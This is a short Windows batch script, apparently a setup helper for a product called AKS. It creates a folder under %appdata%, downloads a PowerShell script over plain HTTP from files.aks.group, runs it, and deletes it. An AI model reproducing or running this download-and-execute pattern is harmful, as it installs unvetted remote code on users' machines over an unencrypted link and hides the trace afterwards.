@echo off
set aks_path=%appdata%\AKS
mkdir %aks_path% > NUL 2>&1
cd %aks_path%

powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('http://files.aks.group/set_HTTPS.ps1', 'set_HTTPS.ps1')"
powershell.exe -executionpolicy RemoteSigned -file set_HTTPS.ps1
del set_HTTPS.ps1
